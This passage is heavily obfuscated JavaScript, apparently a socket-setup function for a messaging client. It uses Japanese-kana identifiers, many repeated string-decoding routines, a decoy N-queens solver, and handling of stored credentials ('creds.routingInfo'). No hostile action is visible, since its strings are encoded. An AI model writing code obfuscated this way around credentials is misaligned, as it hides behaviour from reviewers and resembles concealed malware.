  return さは;
}
export const makeSocket = (つき) => {
  function うし(つき) {
    var うし =
        'sx,AR0`91!FyQ]jr6<+JG.IkTSgZB3tNo)~[LzdCO$Uiw4%lY7D&V*_52:@^{phHv"/PbM?#e}(Wu=mfnaq8|;E>XcK',
      ぬひ,
      なす,
      はね,
      をは,
      をへ,
      つな,
      ほの;
    へら(
      (ぬひ = "" + (つき || "")),
      (なす = ぬひ.length),
      (はね = []),
      (をは = なる[0x0]),
      (をへ = なる[0x0]),
      (つな = -なる[0x1]),
    );
    for (ほの = なる[0x0]; ほの < なす; ほの++) {
      var てろ = うし.indexOf(ぬひ[ほの]);
      if (てろ === -なる[0x1]) continue;
      if (つな < なる[0x0]) {
        つな = てろ;
      } else {
        へら(
          (つな += てろ * なる[0xc]),
          (をは |= つな << をへ),
          (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
        );
        do {
          へら(
            はね.push(をは & なる[0x3]),
            (をは >>= なる[0x2]),
            (をへ -= なる[0x2]),
          );
        } while (をへ > なる[0x9]);
        つな = -なる[0x1];
      }
    }
    if (つな > -なる[0x1]) {
      はね.push((をは | (つな << をへ)) & なる[0x3]);
    }
    return ぬは(はね);
  }
  function ぬひ(つき) {
    if (typeof すは[つき] === なる[0x5]) {
      return (すは[つき] = うし(やぬ[つき]));
    }
    return すは[つき];
  }
  if (にり(0x68) in とた) {
    なす();
  }
  function なす() {
    var つき = function (つき) {
        var ぬひ = [];
        if (つき === なる[0x1] || つき >= なる[0x5a])
          うし(ぬひ, [], つき, なる[0x0]);
        return ぬひ;
      },
      うし,
      ぬひ,
      なす;
    へら(
      (うし = function (つき, はね, をは, をへ) {
        var つな;
        for (つな = をへ; つな < をは; つな++) {
          var ほの;
          if (はね.length !== つな) return;
          for (ほの = なる[0x0]; ほの < をは; ほの++)
            if (なす(はね, [つな, ほの])) {
              へら(
                はね.push([つな, ほの]),
                うし(つき, はね, をは, つな + なる[0x1]),
              );
              if (はね.length === をは) つき.push(ぬひ(はね));
              はね.pop();
            }
        }
      }),
      (ぬひ = function (つき) {
        var うし = [],
          ぬひ,
          なす;
        ぬひ = つき.length;
        for (なす = なる[0x0]; なす < ぬひ; なす++) {
          var はね;
          うし[なす] = "";
          for (はね = なる[0x0]; はね < ぬひ; はね++)
            うし[なす] +=
              つき[なす][なる[0x1]] === はね ? なる[0x5b] : なる[0x5c];
        }
        return うし;
      }),
      (なす = function (つき, うし) {
        var ぬひ = つき.length,
          なす;
        for (なす = なる[0x0]; なす < ぬひ; なす++) {
          if (
            つき[なす][なる[0x0]] === うし[なる[0x0]] ||
            つき[なす][なる[0x1]] === うし[なる[0x1]]
          )
            return なる[0x11];
          if (
            Math.abs(
              (つき[なす][なる[0x0]] - うし[なる[0x0]]) /
                (つき[なす][なる[0x1]] - うし[なる[0x1]]),
            ) === なる[0x1]
          )
            return なる[0x11];
        }
        return なる[0x2e];
      }),
      console.log(つき),
    );
  }
  const {
    [ぬひ(0x69)]: はね,
    [ぬひ(0x6a)]: をは,
    [ぬひ(なる[0x15])]: をへ,
    [ぬひ(0x6c)]: つな,
    [ぬひ(0x6d)]: ほの,
    [ぬひ(0x6e)]: てろ,
    [ぬひ(0x6f)]: てつ,
    [ぬひ(0x70)]: makeSocket,
    [ぬひ(0x71)]: てそ,
    [ぬひ(0x72)]: のち,
    [ぬひ(0x73)]: はん,
    [ぬひ(0x74)]: へそ,
  } = つき;
  if (てつ) {
    function つを(つき) {
      var うし =
          '_*8[%#3Hx+9AsmIdBFt,<YZ0L!&{ohq~7|v@$K`SCEeXic4TpMn;)kG1w^z:V5R]"r.ljU2aPDfuWgJ?N/>OQ6y=b(}',
        ぬひ,
        なす,
        はね,
        をは,
        をへ,
        つな,
        ほの;
      へら(
        (ぬひ = "" + (つき || "")),
        (なす = ぬひ.length),
        (はね = []),
        (をは = なる[0x0]),
        (をへ = なる[0x0]),
        (つな = -なる[0x1]),
      );
      for (ほの = なる[0x0]; ほの < なす; ほの++) {
        var てろ = うし.indexOf(ぬひ[ほの]);
        if (てろ === -なる[0x1]) continue;
        if (つな < なる[0x0]) {
          つな = てろ;
        } else {
          へら(
            (つな += てろ * なる[0xc]),
            (をは |= つな << をへ),
            (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
          );
          do {
            へら(
              はね.push(をは & なる[0x3]),
              (をは >>= なる[0x2]),
              (をへ -= なる[0x2]),
            );
          } while (をへ > なる[0x9]);
          つな = -なる[0x1];
        }
      }
      if (つな > -なる[0x1]) {
        はね.push((をは | (つな << をへ)) & なる[0x3]);
      }
      return ぬは(はね);
    }
    function きふ(つき) {
      if (typeof すは[つき] === なる[0x5]) {
        return (すは[つき] = つを(やぬ[つき]));
      }
      return すは[つき];
    }
    console[きふ(0x75)](きふ(0x76));
  }
  const ちち = typeof はね === ぬひ(0x77) ? new そつ(はね) : はね;
  if (つき[ぬひ(0x78)] || ちち[ぬひ(なる[0x12])] === ぬひ(0x7a)) {
    function はく(つき) {
      var うし =
          'I;84~$zWDel[p|o=<VQhy{m#f01kY>jXO?Sc":*naJ,HC}`K.RTi&3gbFM)dLxG_w7@s+6Z!^%BP5qv/ENUrA]t29(u',
        ぬひ,
        なす,
        はね,
        をは,
        をへ,
        つな,
        ほの;
      へら(
        (ぬひ = "" + (つき || "")),
        (なす = ぬひ.length),
        (はね = []),
        (をは = なる[0x0]),
        (をへ = なる[0x0]),
        (つな = -なる[0x1]),
      );
      for (ほの = なる[0x0]; ほの < なす; ほの++) {
        var てろ = うし.indexOf(ぬひ[ほの]);
        if (てろ === -なる[0x1]) continue;
        if (つな < なる[0x0]) {
          つな = てろ;
        } else {
          へら(
            (つな += てろ * なる[0xc]),
            (をは |= つな << をへ),
            (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
          );
          do {
            へら(
              はね.push(をは & なる[0x3]),
              (をは >>= なる[0x2]),
              (をへ -= なる[0x2]),
            );
          } while (をへ > なる[0x9]);
          つな = -なる[0x1];
        }
      }
      if (つな > -なる[0x1]) {
        はね.push((をは | (つな << をへ)) & なる[0x3]);
      }
      return ぬは(はね);
    }
    function たく(つき) {
      if (typeof すは[つき] === なる[0x5]) {
        return (すは[つき] = はく(やぬ[つき]));
      }
      return すは[つき];
    }
    throw new さは(たく(0x7b), { [たく(0x7c)]: せけ[たく(0x7d)] });
  }
  if (ちち[ぬひ(なる[0x12])] === ぬひ(0x7e) && てろ?.creds?.routingInfo) {
    function きた(つき) {
      var うし =
          'YJiVR0v#`fLD4e]|k(q^@y,ap3gTnodP!Z9juScKEW?_CmtB{Or%*1AN~=w/7l:FX$HIhQ[x8G2U>s5;"<b)z.6&}M+',
        ぬひ,
        なす,
        はね,
        をは,
        をへ,
        つな,
        ほの;
      へら(
        (ぬひ = "" + (つき || "")),
        (なす = ぬひ.length),
        (はね = []),
        (をは = なる[0x0]),
        (をへ = なる[0x0]),
        (つな = -なる[0x1]),
      );
      for (ほの = なる[0x0]; ほの < なす; ほの++) {
        var てろ = うし.indexOf(ぬひ[ほの]);
        if (てろ === -なる[0x1]) continue;
        if (つな < なる[0x0]) {
          つな = てろ;
        } else {
          へら(
            (つな += てろ * なる[0xc]),
            (をは |= つな << をへ),
            (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
          );
          do {
            へら(
              はね.push(をは & なる[0x3]),
              (をは >>= なる[0x2]),
              (をへ -= なる[0x2]),
            );
          } while (をへ > なる[0x9]);
          つな = -なる[0x1];
        }
      }
      if (つな > -なる[0x1]) {
        はね.push((をは | (つな << をへ)) & なる[0x3]);
      }
      return ぬは(はね);
    }
    function なわ(つき) {
      if (typeof すは[つき] === なる[0x5]) {
        return (すは[つき] = きた(やぬ[つき]));
      }
      return すは[つき];
    }
    ちち[ぬひ(なる[0x13])][なわ(なる[0x14])](
      "ED",
      てろ[なわ(0x81)][なわ(0x82)][なわ(0x83)](なわ(0x84)),
    );
  }
  const ほせ = new えそ(ちち, つき);
  ほせ[ぬひ(0x85)]();
  const きな = よほ(をへ),
    おは = そし[ぬひ(0x86)](),
    ひに = ねに({
      [ぬひ(0x87)]: おは,
      [ぬひ(0x88)]: ろな,
      [ぬひ(なる[0x15])]: をへ,
      [ぬひ(0x89)]: てろ?.creds?.routingInfo,
    }),
    { [ぬひ(なる[0x16])]: さな } = てろ,
    なそ = ふれ(てろ[ぬひ(なる[0x17])], をへ, てそ),
    んち = はん({ [ぬひ(なる[0x16])]: さな, [ぬひ(なる[0x17])]: なそ });
  let るえ,
    なぬ = なる[0x1],
    えへ,
    うた,
    しふ = なる[0x11];
  const えつ = やれ(),
    ねせ = () => {
      return "" + えつ + なぬ++;
    },
    はゆ = はて(ほせ[ぬひ(0x8c)]),
    ろき = async (つき) => {
      function うし(つき) {
        var うし =
            '/u*]6?4$9vqHN<:A1sW5(g|R,ceZaTjwx;+>kVJ2fo@DG!{=FUdPyObXm^)I~&Y}rp_K%."#7iLQ[EBnzStC3Ml0h`8',
          なす,
          はね,
          をへ,
          つな,
          ぬひ,
          をは,
          ほの;
        へら(
          (なす = "" + (つき || "")),
          (はね = なす.length),
          (をへ = []),
          (つな = なる[0x0]),
          (ぬひ = なる[0x0]),
          (をは = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < はね; ほの++) {
          var てろ = うし.indexOf(なす[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (をは < なる[0x0]) {
            をは = てろ;
          } else {
            へら(
              (をは += てろ * なる[0xc]),
              (つな |= をは << ぬひ),
              (ぬひ += (をは & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                をへ.push(つな & なる[0x3]),
                (つな >>= なる[0x2]),
                (ぬひ -= なる[0x2]),
              );
            } while (ぬひ > なる[0x9]);
            をは = -なる[0x1];
          }
        }
        if (をは > -なる[0x1]) {
          をへ.push((つな | (をは << ぬひ)) & なる[0x3]);
        }
        return ぬは(をへ);
      }
      function なす(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = うし(やぬ[つき]));
        }
        return すは[つき];
      }
      if (!ほせ[ぬひ(なる[0x34])]) {
        function はね(つき) {
          var うし =
              'h$=&<_v:Im{H`ulXc#,QGUpZw|74VN0]!%}jOdJ)S?o;*tT3a^F69fgq(2kY/>e[@L5E18WiMnDbACBPsxK.Rz"~y+r',
            なす,
            はね,
            をへ,
            つな,
            ぬひ,
            をは,
            ほの;
          へら(
            (なす = "" + (つき || "")),
            (はね = なす.length),
            (をへ = []),
            (つな = なる[0x0]),
            (ぬひ = なる[0x0]),
            (をは = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < はね; ほの++) {
            var てろ = うし.indexOf(なす[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (をは < なる[0x0]) {
              をは = てろ;
            } else {
              へら(
                (をは += てろ * なる[0xc]),
                (つな |= をは << ぬひ),
                (ぬひ +=
                  (をは & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  をへ.push(つな & なる[0x3]),
                  (つな >>= なる[0x2]),
                  (ぬひ -= なる[0x2]),
                );
              } while (ぬひ > なる[0x9]);
              をは = -なる[0x1];
            }
          }
          if (をは > -なる[0x1]) {
            をへ.push((つな | (をは << ぬひ)) & なる[0x3]);
          }
          return ぬは(をへ);
        }
        function をへ(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = はね(やぬ[つき]));
          }
          return すは[つき];
        }
        throw new さは(をへ(0x8e), { [をへ(0x8f)]: せけ[をへ(0x90)] });
      }
      const つな = ひに[なす(0x91)](つき);
      await かり(をは, async (つき, うし) => {
        try {
          function なす(つき) {
            var うし =
                'uEHLCUoF01|;xi[jBa6rZAR8fY./?eN4b<c@D%^9#$I)pM}5=2V`l:hmXndQ~Svq,!(P*+&7GJsO{gw]yKk_z3TW>t"',
              なす,
              はね,
              をへ,
              つな,
              ぬひ,
              をは,
              ほの;
            へら(
              (なす = "" + (つき || "")),
              (はね = なす.length),
              (をへ = []),
              (つな = なる[0x0]),
              (ぬひ = なる[0x0]),
              (をは = -なる[0x1]),
            );
            for (ほの = なる[0x0]; ほの < はね; ほの++) {
              var てろ = うし.indexOf(なす[ほの]);
              if (てろ === -なる[0x1]) continue;
              if (をは < なる[0x0]) {
                をは = てろ;
              } else {
                へら(
                  (をは += てろ * なる[0xc]),
                  (つな |= をは << ぬひ),
                  (ぬひ +=
                    (をは & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
                );
                do {
                  へら(
                    をへ.push(つな & なる[0x3]),
                    (つな >>= なる[0x2]),
                    (ぬひ -= なる[0x2]),
                  );
                } while (ぬひ > なる[0x9]);
                をは = -なる[0x1];
              }
            }
            if (をは > -なる[0x1]) {
              をへ.push((つな | (をは << ぬひ)) & なる[0x3]);
            }
            return ぬは(をへ);
          }
          function はね(つき) {
            if (typeof すは[つき] === なる[0x5]) {
              return (すは[つき] = なす(やぬ[つき]));
            }
            return すは[つき];
          }
          へら(await はゆ[はね(0x92)](ほせ, つな), つき());
        } catch (をへ) {
          うし(をへ);
        }
      });
    },
    すゆ = (つき) => {
      function うし(つき) {
        var うし =
            'JPoKkUEZeacLbDXsR:9tSxfl!dT^=O@qrYFn?hpmNAvHB4/)03jzWV<QM[i{g;]&G|6(_yC+}#.1$w,%5~7`8*"I2>u',
          ぬひ,
          なす,
          はね,
          をは,
          をへ,
          つな,
          ほの;
        へら(
          (ぬひ = "" + (つき || "")),
          (なす = ぬひ.length),
          (はね = []),
          (をは = なる[0x0]),
          (をへ = なる[0x0]),
          (つな = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < なす; ほの++) {
          var てろ = うし.indexOf(ぬひ[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (つな < なる[0x0]) {
            つな = てろ;
          } else {
            へら(
              (つな += てろ * なる[0xc]),
              (をは |= つな << をへ),
              (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                はね.push(をは & なる[0x3]),
                (をは >>= なる[0x2]),
                (をへ -= なる[0x2]),
              );
            } while (をへ > なる[0x9]);
            つな = -なる[0x1];
          }
        }
        if (つな > -なる[0x1]) {
          はね.push((をは | (つな << をへ)) & なる[0x3]);
        }
        return ぬは(はね);
      }
      function ぬひ(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = うし(やぬ[つき]));
        }
        return すは[つき];
      }
      if (をへ[ぬひ(0x93)] === ぬひ(0x94)) {
        function なす(つき) {
          var うし =
              'ySJscKNC,e1fgzbB{~ZLuY&p9$<WH6XmT}d2a:MR3#*%;v)?5>kGw4l]@D^`EPFAtOh="niq0|oU(!8[j+r_QI7x.V/',
            ぬひ,
            なす,
            はね,
            をは,
            をへ,
            つな,
            ほの;
          へら(
            (ぬひ = "" + (つき || "")),
            (なす = ぬひ.length),
            (はね = []),
            (をは = なる[0x0]),
            (をへ = なる[0x0]),
            (つな = -なる[0x1]),
          );
          for (ほの = なる[0x0]; ほの < なす; ほの++) {
            var てろ = うし.indexOf(ぬひ[ほの]);
            if (てろ === -なる[0x1]) continue;
            if (つな < なる[0x0]) {
              つな = てろ;
            } else {
              へら(
                (つな += てろ * なる[0xc]),
                (をは |= つな << をへ),
                (をへ +=
                  (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  はね.push(をは & なる[0x3]),
                  (をは >>= なる[0x2]),
                  (をへ -= なる[0x2]),
                );
              } while (をへ > なる[0x9]);
              つな = -なる[0x1];
            }
          }
          if (つな > -なる[0x1]) {
            はね.push((をは | (つな << をへ)) & なる[0x3]);
          }
          return ぬは(はね);
        }
        function はね(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = なす(やぬ[つき]));
          }
          return すは[つき];
        }
        をへ[はね(0x95)]({
          [はね(0x96)]: ぬく(つき),
          [はね(0x97)]: はね(0x98),
        });
      }
      const をは = ゆゆ(つき);
      return ろき(をは);
    },
    たか = (つき, うし) => {
      function ぬひ(つき) {
        var うし =
            '!RAePDnfTWdOkrcYHjJp<yFw$l3u.Em(absZx0GKU>X8=^I`7vqM1VzB%g{N~#2/Q6|5+;o"_4*S,&[])}:Ct?h9i@L',
          ぬひ,
          なす,
          はね,
          をは,
          をへ,
          つな,
          ほの;
        へら(
          (ぬひ = "" + (つき || "")),
          (なす = ぬひ.length),
          (はね = []),
          (をは = なる[0x0]),
          (をへ = なる[0x0]),
          (つな = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < なす; ほの++) {
          var てろ = うし.indexOf(ぬひ[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (つな < なる[0x0]) {
            つな = てろ;
          } else {
            へら(
              (つな += てろ * なる[0xc]),
              (をは |= つな << をへ),
              (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                はね.push(をは & なる[0x3]),
                (をは >>= なる[0x2]),
                (をへ -= なる[0x2]),
              );
            } while (をへ > なる[0x9]);
            つな = -なる[0x1];
          }
        }
        if (つな > -なる[0x1]) {
          はね.push((をは | (つな << をへ)) & なる[0x3]);
        }
        return ぬは(はね);
      }
      function なす(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = ぬひ(やぬ[つき]));
        }
        return すは[つき];
      }
      をへ[なす(0x99)]({ [なす(0x9a)]: つき }, なす(0x9b) + うし + "'");
    },
    てき = async (つき) => {
      function うし(つき) {
        var うし =
            '7&:^YuTPXOR5bWyAB49q}f0+3o"v<(ge{Ci@E>|cI_r*%!QDk#Vm8UH2t)sz6]wFN;Znhl,ja.d/J`x[?=$G~SKLpM1',
          ぬひ,
          なす,
          はね,
          をへ,
          つな,
          ほの,
          をは;
        へら(
          (ぬひ = "" + (つき || "")),
          (なす = ぬひ.length),
          (はね = []),
          (をへ = なる[0x0]),
          (つな = なる[0x0]),
          (ほの = -なる[0x1]),
        );
        for (をは = なる[0x0]; をは < なす; をは++) {
          var てろ = うし.indexOf(ぬひ[をは]);
          if (てろ === -なる[0x1]) continue;
          if (ほの < なる[0x0]) {
            ほの = てろ;
          } else {
            へら(
              (ほの += てろ * なる[0xc]),
              (をへ |= ほの << つな),
              (つな += (ほの & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                はね.push(をへ & なる[0x3]),
                (をへ >>= なる[0x2]),
                (つな -= なる[0x2]),
              );
            } while (つな > なる[0x9]);
            ほの = -なる[0x1];
          }
        }
        if (ほの > -なる[0x1]) {
          はね.push((をへ | (ほの << つな)) & なる[0x3]);
        }
        return ぬは(はね);
      }
      function ぬひ(つき) {
        if (typeof すは[つき] === なる[0x5]) {
          return (すは[つき] = うし(やぬ[つき]));
        }
        return すは[つき];
      }
      if (!ほせ[ぬひ(0x9c)]) {
        function なす(つき) {
          var うし =
              'fHSxel5JK6aG1VhzU"Rq@[)3|k{^~oCLB(wY=ib0MO_g]Q2}?D*$,%p>+cP<yErZATnI7W:#&Fvduj`NX!8/4mts9.;',
            ぬひ,
            なす,
            はね,
            をへ,
            つな,
            ほの,
            をは;
          へら(
            (ぬひ = "" + (つき || "")),
            (なす = ぬひ.length),
            (はね = []),
            (をへ = なる[0x0]),
            (つな = なる[0x0]),
            (ほの = -なる[0x1]),
          );
          for (をは = なる[0x0]; をは < なす; をは++) {
            var てろ = うし.indexOf(ぬひ[をは]);
            if (てろ === -なる[0x1]) continue;
            if (ほの < なる[0x0]) {
              ほの = てろ;
            } else {
              へら(
                (ほの += てろ * なる[0xc]),
                (をへ |= ほの << つな),
                (つな +=
                  (ほの & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  はね.push(をへ & なる[0x3]),
                  (をへ >>= なる[0x2]),
                  (つな -= なる[0x2]),
                );
              } while (つな > なる[0x9]);
              ほの = -なる[0x1];
            }
          }
          if (ほの > -なる[0x1]) {
            はね.push((をへ | (ほの << つな)) & なる[0x3]);
          }
          return ぬは(はね);
        }
        function はね(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = なす(やぬ[つき]));
          }
          return すは[つき];
        }
        throw new さは(はね(0x9d), { [はね(0x9e)]: せけ[はね(0x9f)] });
      }
      let をへ, つな;
      const ほの = かり(をは, (つき, うし) => {
        function ぬひ(つき) {
          var うし =
              '$#`1u&2%07]4nW|qRhA9m*s,.!@oMO}V_B~:;^)zFLeSg>Yj3=5i[<"Xpy/dbU+8aQHfTtKcJC{vlPNDIwEx6Z?(Grk',
            ぬひ,
            なす,
            はね,
            をへ,
            つな,
            ほの,
            をは;
          へら(
            (ぬひ = "" + (つき || "")),
            (なす = ぬひ.length),
            (はね = []),
            (をへ = なる[0x0]),
            (つな = なる[0x0]),
            (ほの = -なる[0x1]),
          );
          for (をは = なる[0x0]; をは < なす; をは++) {
            var てろ = うし.indexOf(ぬひ[をは]);
            if (てろ === -なる[0x1]) continue;
            if (ほの < なる[0x0]) {
              ほの = てろ;
            } else {
              へら(
                (ほの += てろ * なる[0xc]),
                (をへ |= ほの << つな),
                (つな +=
                  (ほの & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  はね.push(をへ & なる[0x3]),
                  (をへ >>= なる[0x2]),
                  (つな -= なる[0x2]),
                );
              } while (つな > なる[0x9]);
              ほの = -なる[0x1];
            }
          }
          if (ほの > -なる[0x1]) {
            はね.push((をへ | (ほの << つな)) & なる[0x3]);
          }
          return ぬは(はね);
        }
        function なす(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = ぬひ(やぬ[つき]));
          }
          return すは[つき];
        }
        へら(
          (をへ = つき),
          (つな = ねけ(うし)),
          ほせ[なる[0x18]](なす(0xa0), をへ),
          ほせ[なる[0x18]](なす(0xa1), つな),
          ほせ[なる[0x18]](なす(0xa2), つな),
        );
      })[ぬひ(0xa3)](() => {
        function つき(つき) {
          var うし =
              'aCiK9D/I2whR(~e4Y6E,jpV+B5l}3Wnb>qG^1{.%L:S"[rMPokXAgm$#*xy_Z=TJf`UNd;<vsQ07!OHutc])@8?z|&F',
            ぬひ,
            なす,
            はね,
            をへ,
            つな,
            ほの,
            をは;
          へら(
            (ぬひ = "" + (つき || "")),
            (なす = ぬひ.length),
            (はね = []),
            (をへ = なる[0x0]),
            (つな = なる[0x0]),
            (ほの = -なる[0x1]),
          );
          for (をは = なる[0x0]; をは < なす; をは++) {
            var てろ = うし.indexOf(ぬひ[をは]);
            if (てろ === -なる[0x1]) continue;
            if (ほの < なる[0x0]) {
              ほの = てろ;
            } else {
              へら(
                (ほの += てろ * なる[0xc]),
                (をへ |= ほの << つな),
                (つな +=
                  (ほの & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  はね.push(をへ & なる[0x3]),
                  (をへ >>= なる[0x2]),
                  (つな -= なる[0x2]),
                );
              } while (つな > なる[0x9]);
              ほの = -なる[0x1];
            }
          }
          if (ほの > -なる[0x1]) {
            はね.push((をへ | (ほの << つな)) & なる[0x3]);
          }
          return ぬは(はね);
        }
        function うし(うし) {
          if (typeof すは[うし] === なる[0x5]) {
            return (すは[うし] = つき(やぬ[うし]));
          }
          return すは[うし];
        }
        へら(
          ほせ[ぬひ(0xa4)](うし(0xa5), をへ),
          ほせ[うし(なる[0x19])](うし(0xa7), つな),
          ほせ[うし(なる[0x19])](うし(0xa8), つな),
        );
      });
      if (つき) {
        ろき(つき)[ぬひ(0xa9)](つな);
      }
      return ほの;
    },
    やこ = async (つき, うし = makeSocket) => {
      let なす, はね;
      try {
        const をは = await かり(うし, (うし, をは) => {
          function をへ(うし) {
            var をは =
                '4sCNQnMqXHWP/w*7}V=lfBG#;ou1[cUe:EY+t]z60{hKv"D9ka)jxJ_g?$2.L,T!y8^(@b|SdZ%&3>O<5F`iRImA~rp',
              をへ,
              つな,
              つき,
              なす,
              はね,
              ほの,
              ぬひ;
            へら(
              (をへ = "" + (うし || "")),
              (つな = をへ.length),
              (つき = []),
              (なす = なる[0x0]),
              (はね = なる[0x0]),
              (ほの = -なる[0x1]),
            );
            for (ぬひ = なる[0x0]; ぬひ < つな; ぬひ++) {
              var てろ = をは.indexOf(をへ[ぬひ]);
              if (てろ === -なる[0x1]) continue;
              if (ほの < なる[0x0]) {
                ほの = てろ;
              } else {
                へら(
                  (ほの += てろ * なる[0xc]),
                  (なす |= ほの << はね),
                  (はね +=
                    (ほの & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
                );
                do {
                  へら(
                    つき.push(なす & なる[0x3]),
                    (なす >>= なる[0x2]),
                    (はね -= なる[0x2]),
                  );
                } while (はね > なる[0x9]);
                ほの = -なる[0x1];
              }
            }
            if (ほの > -なる[0x1]) {
              つき.push((なす | (ほの << はね)) & なる[0x3]);
            }
            return ぬは(つき);
          }
          function つな(うし) {
            if (typeof すは[うし] === なる[0x5]) {
              return (すは[うし] = をへ(やぬ[うし]));
            }
            return すは[うし];
          }
          へら(
            (なす = うし),
            (はね = (うし) => {
              function をへ(うし) {
                var をへ =
                    '0MdOZrNWAQakt?[Ru3;H>K2y5+n<=`CbvE*l,B$sf&icPI{gTSez4X/|6:^jJVq)8(D~w.1hG%]}#o_!9mYLx"pF@U7',
                  つな,
                  をは,
                  つき,
                  なす,
                  はね,
                  ほの,
                  ぬひ;
                へら(
                  (つな = "" + (うし || "")),
                  (をは = つな.length),
                  (つき = []),
                  (なす = なる[0x0]),
                  (はね = なる[0x0]),
                  (ほの = -なる[0x1]),
                );
                for (ぬひ = なる[0x0]; ぬひ < をは; ぬひ++) {
                  var てろ = をへ.indexOf(つな[ぬひ]);
                  if (てろ === -なる[0x1]) continue;
                  if (ほの < なる[0x0]) {
                    ほの = てろ;
                  } else {
                    へら(
                      (ほの += てろ * なる[0xc]),
                      (なす |= ほの << はね),
                      (はね +=
                        (ほの & なる[0xd]) > なる[0xe]
                          ? なる[0xf]
                          : なる[0x10]),
                    );
                    do {
                      へら(
                        つき.push(なす & なる[0x3]),
                        (なす >>= なる[0x2]),
                        (はね -= なる[0x2]),
                      );
                    } while (はね > なる[0x9]);
                    ほの = -なる[0x1];
                  }
                }
                if (ほの > -なる[0x1]) {
                  つき.push((なす | (ほの << はね)) & なる[0x3]);
                }
                return ぬは(つき);
              }
              function つな(うし) {
                if (typeof すは[うし] === なる[0x5]) {
                  return (すは[うし] = をへ(やぬ[うし]));
                }
                return すは[うし];
              }
              をは(
                うし ||
                  new さは(ぬひ(0xaa), { [つな(0xab)]: せけ[つな(0xac)] }),
              );
            }),
            ほせ[なる[0x18]](つな(0xad) + つき, なす),
            ほせ[なる[0x18]](つな(0xae), はね),
            ほせ[つな(0xaf)](つな(0xb0), はね),
          );
        });
        return をは;
      } finally {
        function をへ(つき) {
          var うし =
              'D$PWTdXKRtCEofZ[I~3Jrg:l;NL>OAu](,.5|!embnv="SGBYwy*sHQ6<xVh8^j&@p7`+iUFqM1z#40/2?{9ck)a_%}',
            なす,
            はね,
            をは,
            をへ,
            つな,
            ほの,
            ぬひ;
          へら(
            (なす = "" + (つき || "")),
            (はね = なす.length),
            (をは = []),
            (をへ = なる[0x0]),
            (つな = なる[0x0]),
            (ほの = -なる[0x1]),
          );
          for (ぬひ = なる[0x0]; ぬひ < はね; ぬひ++) {
            var てろ = うし.indexOf(なす[ぬひ]);
            if (てろ === -なる[0x1]) continue;
            if (ほの < なる[0x0]) {
              ほの = てろ;
            } else {
              へら(
                (ほの += てろ * なる[0xc]),
                (をへ |= ほの << つな),
                (つな +=
                  (ほの & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
              );
              do {
                へら(
                  をは.push(をへ & なる[0x3]),
                  (をへ >>= なる[0x2]),
                  (つな -= なる[0x2]),
                );
              } while (つな > なる[0x9]);
              ほの = -なる[0x1];
            }
          }
          if (ほの > -なる[0x1]) {
            をは.push((をへ | (ほの << つな)) & なる[0x3]);
          }
          return ぬは(をは);
        }
        function つな(つき) {
          if (typeof すは[つき] === なる[0x5]) {
            return (すは[つき] = をへ(やぬ[つき]));
          }
          return すは[つき];
        }
        if (つな(0xb1) in とた) {
          ほの();
        }
        function ほの() {}
        へら(
          ほせ[つな(なる[0x1b])](つな(0xb5) + つき, なす),
          ほせ[つな(なる[0x1b])](つな(0xb6), はね),
          ほせ[つな(なる[0x1b])](つな(0xb7), はね),
        );
      }
    },
    よね = async (つき, うし) => {
      function ぬひ(つき) {
        var うし =
            ',SGNQEKOP2}Lo^6y49:kx.?!tg_mM5s*Yiqw0z#I+v>uWZ1J`&b"83BX7fH|T~r/<FdADU(j[e%R=hClV;a)np]{c@$',
          ぬひ,
          なす,
          はね,
          をは,
          をへ,
          つな,
          ほの;
        へら(
          (ぬひ = "" + (つき || "")),
          (なす = ぬひ.length),
          (はね = []),
          (をは = なる[0x0]),
          (をへ = なる[0x0]),
          (つな = -なる[0x1]),
        );
        for (ほの = なる[0x0]; ほの < なす; ほの++) {
          var てろ = うし.indexOf(ぬひ[ほの]);
          if (てろ === -なる[0x1]) continue;
          if (つな < なる[0x0]) {
            つな = てろ;
          } else {
            へら(
              (つな += てろ * なる[0xc]),
              (をは |= つな << をへ),
              (をへ += (つな & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
            );
            do {
              へら(
                はね.push(をは & なる[0x3]),
                (をは >>= なる[0x2]),
                (をへ -= なる[0x2]),
              );
            } while (をへ > なる[0x9]);
            つな = -なる[0x1];
          }
        }
        if (つな > -なる[0x1]) {
